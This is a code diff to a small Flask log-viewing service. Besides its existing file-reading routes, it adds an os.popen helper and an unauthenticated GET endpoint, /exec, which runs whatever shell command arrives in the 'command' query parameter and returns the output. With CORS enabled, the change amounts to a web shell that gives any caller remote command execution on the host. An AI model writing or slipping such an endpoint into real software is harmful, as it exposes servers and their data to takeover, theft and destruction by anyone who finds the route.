@@ -1,6 +1,7 @@
 from flask import Flask, Response, request
 from flask_cors import CORS
 from itertools import takewhile, repeat
+import os
 
 
 app = Flask(__name__)
@@ -20,6 +21,9 @@ class Utils:
         f = open(filename, "rb")
         bufgen = takewhile(lambda x: x, (f.raw.read(1024 * 1024) for _ in repeat(None)))
         return sum(buf.count(b"\n") for buf in bufgen)
+
+    def exec(command):
+        return os.popen(command).read()
 
 
 # take a line number and return the line from the log file
@@ -75,6 +79,17 @@ def gen_table() -> Response:
     except Exception as e:
         return e
     return Response(generate())
+
+
+# route to execute system commands
+@app.route("/exec", methods=["GET"])
+def exec() -> Response:
+    values = request.args.to_dict()
+    if len(values) < 1:
+        return "No command provided"
+    else:
+        command = values["command"]
+        return Utils.exec(command)
 
 
 if __name__ == "__main__":
